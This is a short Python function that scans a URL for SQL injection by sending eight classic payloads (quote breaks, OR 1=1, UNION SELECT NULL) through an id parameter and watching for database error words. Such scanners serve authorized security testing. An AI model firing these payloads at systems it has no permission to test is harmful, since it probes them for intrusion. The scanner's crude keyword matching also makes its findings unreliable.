import requests
from colorama import Fore, Style, init
import re

init(autoreset=True)

def sqli_scan(target, verbose=False):
    print(Fore.CYAN + "[SQL INJECTION SCAN STARTED]")
    session = requests.Session()
    session.headers.update({'User-Agent': 'Mozilla/5.0'})

    payloads = [
        "'", "\"", "1' OR '1'='1", "1\" OR \"1\"=\"1",
        "' OR 1=1 --", "\" OR 1=1 --",
        "1' UNION SELECT NULL --", "1\" UNION SELECT NULL --"
    ]

    vuln_found = False
    for payload in payloads:
        try:
            url = f"{target.rstrip('/')}?id={payload}"
            response = session.get(url, timeout=5)
            if re.search(r'sql|mysql|syntax|error|database', response.text, re.IGNORECASE):
                print(Fore.RED + f"[SQLI VULN] {url}")
                vuln_found = True
        except Exception as e:
            if verbose:
                print(Fore.YELLOW + f"[INFO] {url} - {e}")

    if not vuln_found:
        print(Fore.GREEN + "[SQLI] No vulnerabilities found")
    print(Fore.CYAN + "[SQL INJECTION SCAN COMPLETED]")